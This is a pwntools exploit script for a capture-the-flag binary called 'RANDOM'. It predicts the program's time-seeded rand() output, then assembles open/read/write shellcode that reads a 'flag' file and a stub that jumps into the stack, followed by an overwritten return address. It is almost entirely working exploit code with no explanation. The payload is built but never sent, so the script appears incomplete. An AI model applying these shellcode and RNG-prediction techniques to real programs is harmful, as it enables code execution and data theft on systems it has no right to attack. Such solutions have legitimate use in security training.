from pwn import *
from ctypes import *

context(arch='amd64')
p = process('./RANDOM')
# p = remote('node6.anna.nssctf.cn', 28599)
elf = ELF('./RANDOM')
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))
p.sendline(str(libc.rand() % 50))
haha_addr = 0x40094A
shellcode1 = asm('''
    mov edx,0x67616c66
    push rdx
    mov rdi,rsp
    mov eax,2
    syscall
    mov edi,eax
    mov rsi,rsp
    xor eax,eax
    syscall
    xor edi,2
    mov eax,edi
    syscall
''')
shellcode2 = asm("""
    xor esi,esi
    sub rsp,0x28
    jmp rsp
""")
print(len(shellcode1))
print(len(shellcode2))
payload = shellcode1 + shellcode2 + p64(haha_addr)
p.recvuntil(b'This is the wrong password:')
p.interactive()
